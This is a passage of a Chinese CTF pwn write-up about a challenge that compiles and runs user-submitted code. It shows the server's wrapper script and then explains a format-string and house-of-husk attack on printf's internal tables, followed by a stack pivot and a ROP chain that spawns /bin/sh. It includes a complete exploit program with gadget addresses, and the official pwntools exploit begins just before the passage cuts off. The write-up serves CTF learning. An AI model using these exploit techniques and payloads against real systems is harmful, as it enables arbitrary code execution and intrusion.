+</span></span><span style=display:flex><span>        socket_print(<span style=color:#b44>&#34;stopping&#34;</span>)
+</span></span><span style=display:flex><span>        clean_file(filename)
+</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>pass</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>get_filename</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> <span style=color:#b44>&#34;./tmp/</span><span style=color:#b68;font-weight:700>{}</span><span style=color:#b44>&#34;</span><span style=color:#666>.</span>format(uuid<span style=color:#666>.</span>uuid4()<span style=color:#666>.</span>hex)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>clean_file</span>(filename):
+</span></span><span style=display:flex><span>    socket_print(<span style=color:#b44>&#34;cleaning&#34;</span>)
+</span></span><span style=display:flex><span>    subprocess<span style=color:#666>.</span>run(<span style=color:#b44>&#34;rm -r ../../&#34;</span><span style=color:#666>+</span>filename, shell<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>, timeout<span style=color:#666>=</span><span style=color:#666>60</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>mkdir</span>(path):
+</span></span><span style=display:flex><span>	folder <span style=color:#666>=</span> os<span style=color:#666>.</span>path<span style=color:#666>.</span>exists(path)
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>if</span> <span style=color:#a2f;font-weight:700>not</span> folder:                  
+</span></span><span style=display:flex><span>		os<span style=color:#666>.</span>makedirs(path)          
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>		socket_print(<span style=color:#b44>&#34;There is this folder!&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>input_code</span>(filename):
+</span></span><span style=display:flex><span>    current_directory <span style=color:#666>=</span> os<span style=color:#666>.</span>getcwd()
+</span></span><span style=display:flex><span>    new_directory <span style=color:#666>=</span> current_directory <span style=color:#666>+</span> <span style=color:#b44>&#34;/&#34;</span> <span style=color:#666>+</span> filename
+</span></span><span style=display:flex><span>    os<span style=color:#666>.</span>chdir(new_directory)
+</span></span><span style=display:flex><span>    socket_print(<span style=color:#b44>&#34;current: &#34;</span> <span style=color:#666>+</span> current_directory)
+</span></span><span style=display:flex><span>    socket_print(<span style=color:#b44>&#34;new: &#34;</span> <span style=color:#666>+</span> new_directory)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>with</span> <span style=color:#a2f>open</span>(<span style=color:#b44>&#39;./hello.ugo&#39;</span>, <span style=color:#b44>&#39;w&#39;</span>) <span style=color:#a2f;font-weight:700>as</span> file:
+</span></span><span style=display:flex><span>        <span style=color:#a2f>print</span>(<span style=color:#b44>&#34;input code: &#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#a2f>print</span>(<span style=color:#b44>&#34;</span><span style=color:#b62;font-weight:700>\t</span><span style=color:#b44>input </span><span style=color:#b62;font-weight:700>\&#34;</span><span style=color:#b44>end</span><span style=color:#b62;font-weight:700>\&#34;</span><span style=color:#b44> to stop&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>while</span> <span style=color:#a2f;font-weight:700>True</span>:
+</span></span><span style=display:flex><span>            line <span style=color:#666>=</span> <span style=color:#a2f>input</span>()
+</span></span><span style=display:flex><span>            <span style=color:#a2f;font-weight:700>if</span> line[:<span style=color:#666>3</span>] <span style=color:#666>!=</span> <span style=color:#b44>&#34;end&#34;</span>: 
+</span></span><span style=display:flex><span>                file<span style=color:#666>.</span>write(line<span style=color:#666>+</span><span style=color:#b44>&#34;</span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#a2f;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>break</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>copy_file</span>(filename):
+</span></span><span style=display:flex><span>    mkdir(filename)
+</span></span><span style=display:flex><span>    copy(<span style=color:#b44>&#34;/home/ctf/ugo&#34;</span>, filename<span style=color:#666>+</span><span style=color:#b44>&#34;/ugo&#34;</span>)
+</span></span><span style=display:flex><span>    copy(<span style=color:#b44>&#34;/home/ctf/hello.ugo&#34;</span>, filename<span style=color:#666>+</span><span style=color:#b44>&#34;/hello.ugo&#34;</span>)
+</span></span><span style=display:flex><span>    copy(<span style=color:#b44>&#34;/home/ctf/ir2bin.sh&#34;</span>, filename<span style=color:#666>+</span><span style=color:#b44>&#34;/ir2bin.sh&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>check</span>(filename):
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>while</span> <span style=color:#a2f;font-weight:700>True</span>:
+</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>if</span> sys<span style=color:#666>.</span>stdout<span style=color:#666>.</span>closed:
+</span></span><span style=display:flex><span>            clean_file(filename)
+</span></span><span style=display:flex><span>            socket_print(<span style=color:#b44>&#34;Cleaned up directory:&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>main</span>():
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#filename为./tmp/uuid.uuid4().hex 这种形式</span>
+</span></span><span style=display:flex><span>    filename <span style=color:#666>=</span> get_filename()
+</span></span><span style=display:flex><span>    <span style=color:#a2f>print</span>(<span style=color:#b44>&#34;Working path: &#34;</span><span style=color:#666>+</span>filename)
+</span></span><span style=display:flex><span>    Thread(target<span style=color:#666>=</span>check,args<span style=color:#666>=</span>filename)
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#创建文件夹filename，再把ugo,hello.ugo,ir2bin.sh这个几个文件复制到这个Working path</span>
+</span></span><span style=display:flex><span>    copy_file(filename)
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#用户的输入会存到hello.ugo文件中，输入以end字符作为终止</span>
+</span></span><span style=display:flex><span>    input_code(filename)
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#运行ir2bin.sh，再运行./hello文件</span>
+</span></span><span style=display:flex><span>    run_challenge(filename)
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#清理Working path环境</span>
+</span></span><span style=display:flex><span>    clean_file(filename)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>if</span> __name__ <span style=color:#666>==</span> <span style=color:#b44>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><p>ir2bin.sh,直接运行ugo会把当前目录下hello.ugo变成hello.ll文件，ir2bin.sh就是把hello.ugo编译链接成一个可执行文件hello</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080>#!/bin/sh
+</span></span></span><span style=display:flex><span><span style=color:#080></span>
+</span></span><span style=display:flex><span>./ugo
+</span></span><span style=display:flex><span>llvm-as hello.ll -o hello.bc
+</span></span><span style=display:flex><span>llc hello.bc -o hello.s
+</span></span><span style=display:flex><span>as -o hello.o hello.s
+</span></span><span style=display:flex><span>gcc -no-pie -static hello.o -o hello
+</span></span><span style=display:flex><span>rm hello.bc hello.s hello.o
+</span></span></code></pre></div><p>针对上述的分析，就知道是我们用户自己输入code然后被编译链接运行，如果能直接getshell，那么就打通了</p><p>那么最后就是分析ugo这个文件了，看看code有什么限制。在github_com_klang_ugo_parser__ptr_Parser_parseFile函数中看到了限制 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/62.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/63.png alt></p><p>只能使用printf和write函数，那么就可以想到是格式化字符串漏洞了，不过由于ir2bin.sh是静态链接，同时是no pie,所以这个格式化字符串很有意思，因为是利用静态链接里面的gadget，在函数运行的过程中利用格式化字符串覆盖自己函数的返回地址，而且途中用户是不可以进行输入的。</p><p>这里首先思考如何覆盖返回地址，虽然随便利用格式化字符串，但是有个问题。<strong>就是利用%p泄露出来的东西我们不像平时打格式化字符串那样可以交互，导致泄露了我们也无法存到变量中。</strong>
+所以根本覆盖不了返回地址，只能想是否可以打其他的方式，比如exit函数等类似的ogg</p><p>最后想到是可以利用<strong>house of husk</strong>，因为有printf函数，只要覆盖__printf_function_table不为0，覆盖__printf_arginfo_table为一个地址，就可以执行__printf_arginfo_table[spec]​的函数
+但是这还不够，<strong>因为是静态链接的，没有像libc.so.6中有ogg可以用，所以必须ROP</strong>
+显然这里要栈迁移了，常见的栈迁移利用方式是leave;ret或者setcontext，但是显然这里行不通，<strong>因为栈地址都无法泄露</strong></p><p>这里思路就卡住了，卡了很久，最后想着随便找找和rsp相关的gadget，利用了如下指令 ROPgadget &ndash;binary hello | grep &ldquo;add rsp.*&rdquo;
+<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/64.png alt> 可能有人会疑问为什么会找到这个<strong>add rsp, 0x1018 ; ret这个如此奇怪的gadget，这里是动调看出来的结果，发现每次执行house of husk那个链的时候，栈情况总是差main函数超过0x1000的偏移</strong></p><p>这里我们就可以这样布置，先把ROP写到栈上，然后通过house of husk执行add rsp,0x1018;ret，然后执行栈上ROP，就可以getshell,这里格式化字符串也很折磨，<strong>因为不让连续出现两个%,否则ugo执行的时候就会报错</strong>，只能手动算有多少个a，然后输入</p><p>这里还有个地方要注意，<strong>专门定义了一个my_func()在main中调用，这也是动调的时候发现的</strong>，只有这样add rsp,0x1018;ret才能到正确的位置进行ROP，<strong>因为这里栈里面的偏移都是相对的，所以只能通过在main中调用另一个函数的方式来进行调整栈结构</strong></p><p>可以看到这里<strong>printf_arginfo_table存的bss地址，bss[spec]存着add rsp,0x1018;ret地址</strong><img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/65.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/66.png alt>
+执行完add rsp,0x1018后，<strong>ret到的地址是个pop_rbx，实际上它是pop4 ;ret，通过pop调整rsp指向最后指向我们布置的ROP，最后getshell</strong> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/67.png alt></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#a2f;font-weight:700>package</span> main
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>func</span> <span style=color:#00a000>my_func</span>() {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> u4 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> u3 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> u2 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> u1 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> u0 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> pop4 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0x47d932</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>// 0x4cd7e8 &lt;__printf_function_table&gt; 
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#080;font-style:italic>// 0x4cdc30 &lt;__printf_arginfo_table&gt;
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#a2f;font-weight:700>var</span> a <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> printf_function_table <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4cd7e8</span>
+</span></span><span style=display:flex><span>   
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> b0 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> printf_arginfo_table0  <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4cdc30</span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> b1 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> printf_arginfo_table1  <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4cdc31</span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> b2 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> printf_arginfo_table2  <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4cdc32</span> 
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//add_rsp
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#a2f;font-weight:700>var</span> d0 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss0_ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c87c0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> d1 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss1_ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c87c1</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> d2 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss2_ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c87c2</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>// sh_addr=0x4c88d8 
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#a2f;font-weight:700>var</span> f0 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss0___ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c88d8</span> 
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> f1 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss1___ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c88d9</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> f2 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss2___ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c88da</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> f3 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss3___ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c88db</span> 
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> f4 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss4___ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c88dc</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> f5 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss5___ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c88dd</span> 
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> f6 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> bss6___ <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0x4c88de</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//bss_start= 0x4c87c0-0x398 =0x4c8428
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>   
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//printf_arginfo_table0 
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%18$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//printf_arginfo_table1
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%17$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//printf_arginfo_table2
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%16$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//bss add_rsp_ret=0x4514ab
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%15$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaa%14$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%13$hhn&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//  2f 62 69 6e 2f 73 68
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%11$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%10$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%9$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%8$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%7$hhn&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%6$hhn&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>// write printf_function_table 要在最后修改
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;aaaa%19$hhn&#34;</span>) 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>0</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>func</span> <span style=color:#00a000>main</span>() {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>     <span style=color:#a2f;font-weight:700>var</span> l12 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> syscall <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0x401d94</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l11 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> rax <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0x3b</span>
+</span></span><span style=display:flex><span>   
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l10 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> pop_rax <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0x40191a</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l8 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l9 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l3 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l4 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l5 <span style=color:#0b0;font-weight:700>int</span> = <span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> pop_rdx_rbx <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0x4859cb</span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l6 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l7 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l2 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> pop_rsi <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0x40a04e</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l1 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> sh_addr <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0x4c88d8</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> l0 <span style=color:#0b0;font-weight:700>int</span> =<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> pop_rdi <span style=color:#0b0;font-weight:700>int</span>=<span style=color:#666>0x401fdf</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#00a000>my_func</span>()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#00a000>printf</span>(<span style=color:#b44>&#34;%s&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>0</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=官方wp>官方WP
+<a class=header-anchor href=#%e5%ae%98%e6%96%b9wp></a></h2><p>其实可以发现，题目给的一个example.ugo给了提示，直接运行它就会segmentfault，所以官方题解也是这样</p><p><strong>string 类型的错误处理，通过调用返回类型为 string 的函数来构造栈溢出，最后注入ROP链</strong></p><ul><li>exp</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>string</span> <span style=color:#a2f;font-weight:700>import</span> Template
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p <span style=color:#666>=</span> remote(<span style=color:#b44>&#34;127.0.0.1&#34;</span>,<span style=color:#666>2102</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>code <span style=color:#666>=</span> <span style=color:#b44>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#b44>package main
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>func add() string{
+</span></span></span><span style=display:flex><span><span style=color:#b44>    return &#34;$str&#34;
+</span></span></span><span style=display:flex><span><span style=color:#b44>}
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>func main() int {
+</span></span></span><span style=display:flex><span><span style=color:#b44>    var b string = &#34;bbbbbbb&#34;
+</span></span></span><span style=display:flex><span><span style=color:#b44>    var a string = add()
+</span></span></span><span style=display:flex><span><span style=color:#b44>    a = &#34;$payload&#34;
+</span></span></span><span style=display:flex><span><span style=color:#b44>    return 0x3b
+</span></span></span><span style=display:flex><span><span style=color:#b44>}
+</span></span></span><span style=display:flex><span><span style=color:#b44>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>template <span style=color:#666>=</span> Template(code)
+</span></span><span style=display:flex><span>payload  <span style=color:#666>=</span> p64(<span style=color:#666>0x498010</span>)<span style=color:#666>*</span><span style=color:#666>8</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0x0000000000409ebe</span>)<span style=color:#666>+</span>p64(<span style=color:#666>0</span>)
